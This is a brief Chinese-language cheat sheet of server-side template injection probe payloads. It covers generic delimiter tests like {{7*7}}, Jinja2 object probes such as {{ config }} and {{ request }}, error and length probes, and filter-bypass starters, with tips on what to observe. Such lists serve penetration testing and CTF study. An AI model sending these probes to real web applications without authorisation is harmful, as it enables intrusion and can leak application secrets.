# 常见探测 Payload

## 通用分隔符探测
```txt
{{7*7}}
${7*7}
#{7*7}
<%= 7*7 %>
{{1337}}
${1337}
```

## Jinja2 基础对象探测
```jinja2
{{ config }}
{{ request }}
{{ self }}
{{ url_for }}
{{ get_flashed_messages }}
```

## 报错探测
```jinja2
{{ 1/0 }}
{{ no_such_var }}
{{ request.no_such_attr }}
```

## 长度与差异探测
```jinja2
{{ "A"*10 }}
{{ "A"*100 }}
{{ "A"*1000 }}
```

## 过滤绕过起手式
```jinja2
{{ request|attr("args") }}
{{ "ab" ~ "cd" }}
```

## 观察要点
- 求值结果
- 原样输出
- HTML 编码
- 报错类名
- 响应长度
- 耗时

## 使用原则
- 先短、再稳、再复杂。
- 一次只改一个变量，便于判断是哪个特征导致结果变化。
